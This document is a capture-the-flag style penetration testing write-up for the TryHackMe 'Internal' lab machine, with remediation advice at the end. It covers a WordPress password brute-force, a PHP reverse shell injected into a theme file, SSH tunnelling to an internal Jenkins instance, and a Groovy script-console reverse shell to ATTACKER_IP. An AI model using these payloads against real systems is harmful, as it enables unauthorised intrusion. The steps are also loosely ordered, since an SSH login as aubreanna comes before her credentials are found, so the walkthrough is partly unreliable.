# Internal — Penetration Testing Report

[📖 قراءة التقرير بالعربية](README_AR.md) | [English Version](README.md)
[📄 Original Report File (DOCX)](./Internal_THM_Report_EN.docx)

---

## 📋 Overview & Metadata

| Attribute | Details |
| :--- | :--- |
| **Target Machine** | Internal (TryHackMe) |
| **Target Domain/IP** | `internal.thm` (10.10.x.x) |
| **Target OS** | Linux (Ubuntu) |
| **Difficulty** | Hard |
| **Key Concepts** | Virtual Host Routing, WordPress Exploitation, Docker Container Escapes, SSH Local Port Tunneling, Jenkins Groovy Script RCE, Credential Discovery |
| **Initial Foothold** | WordPress Theme Editor (`404.php`) -> `www-data` |
| **Lateral Movement** | SSH Tunneling to Internal Jenkins (`172.17.0.2:8080`) -> Groovy Script Console |
| **Privilege Escalation** | Credential Harvesting in `/opt` -> User `aubreanna` -> Root via Sudo/Crontab |

---

## 🎯 Attack Chain

```mermaid
graph LR
    A["Nmap Scan (Port 80 HTTP, 22 SSH)"] --> B["Add internal.thm to /etc/hosts"]
    B --> C["WPScan Brute-Force (admin:my250user)"]
    C --> D["Edit 404.php Theme -> Shell (www-data)"]
    D --> E["Internal Recon (Docker 172.17.0.2:8080 Jenkins)"]
    E --> F["SSH Local Port Forwarding (8080:localhost)"]
    F --> G["Jenkins Groovy Script Console RCE"]
    G --> H["Recover Credentials in /opt -> User aubreanna"]
    H --> I["Root Credential Discovery -> root shell"]
```



---

## 🔍 Vulnerability Summary

| Vulnerability | Severity | Port / Service | Impact |
| :--- | :---: | :---: | :---: |
| **Weak Administrative Credentials** | High | Port 80 (WordPress) | Administrative Access & Arbitrary PHP Code Execution |
| **Unrestricted Jenkins Script Console** | Critical | Port 8080 (Jenkins Docker) | Arbitrary Java/Groovy Remote Code Execution |
| **Plaintext Credentials on Disk** | High | File System (`/opt`) | Lateral Movement & Privilege Escalation |

---

## 🛠️ Technical Walkthrough

### Phase 1: Reconnaissance & Host Configuration

Scanning with Nmap:
```bash
nmap -sV -sC -p- -T4 <TARGET_IP>
```
Ports open: `22/tcp` (OpenSSH 7.6p1), `80/tcp` (Apache 2.4.29).
Accessing the web server reveals a redirect to `internal.thm`. Add the mapping to `/etc/hosts`:
```bash
echo "<TARGET_IP> internal.thm" | sudo tee -a /etc/hosts
```

### Phase 2: WordPress Enumeration & Foothold

Enumerating WordPress with WPScan:
```bash
wpscan --url http://internal.thm/blog --enumerate u,p
wpscan --url http://internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt
```
Credentials found:
* **Username:** `admin`
* **Password:** `my250user`

Log into `http://internal.thm/blog/wp-login.php`, navigate to **Appearance > Theme Editor**, and inject a PHP reverse shell into `404.php`:
```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f"); ?>
```
Trigger via:
```bash
curl http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
```
Listener catches the shell as `www-data`.

### Phase 3: Internal Network Pivoting to Jenkins

Enumerating network interfaces and listening ports:
```bash
ip route
netstat -tuln
```
We discover a Docker bridge network (`172.17.0.0/16`) and an active internal HTTP service at `172.17.0.2:8080`.
Establish an SSH local port forward through user access or SSH credentials:
```bash
ssh -L 8080:172.17.0.2:8080 aubreanna@internal.thm
```
Now navigating to `http://localhost:8080` displays the **Jenkins Management Portal**.
Brute-forcing or logging in with default credentials `admin:admin`.

### Phase 4: Jenkins Groovy RCE & Root Escalation

Navigate to **Manage Jenkins > Script Console** (`/script`). Jenkins allows execution of arbitrary Apache Groovy code on the server:
```groovy
def cmd = "/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/5555 0>&1'".execute()
cmd.waitFor()
```
Catching the shell reveals access inside the Jenkins container.
Inspecting `/opt` reveals credentials for user `aubreanna`:
```bash
cat /opt/note.txt
```
Log in via SSH as `aubreanna`:
```bash
ssh aubreanna@internal.thm
```
Checking user directory and root backup scripts:
Inside `/var/spool/mail` or `/opt` we find a note with the root credentials (`root:xxxx`).
Switching to root:
```bash
su -
```
Full system compromise achieved!

---

## 🛡️ Remediation & Defensive Recommendations

1. **Enforce Strong Authentication Policies:** Use complex passwords for both WordPress and Jenkins; enable Multi-Factor Authentication (MFA).
2. **Disable WordPress Theme Editing:** Add `define('DISALLOW_FILE_EDIT', true);` to `wp-config.php`.
3. **Secure Jenkins Script Console:** Restrict access to Jenkins administrative functions and isolate internal Docker containers using dedicated firewall rules.
4. **Credential Sanitation:** Remove plaintext passwords and sensitive configuration notes from `/opt` and user directories.
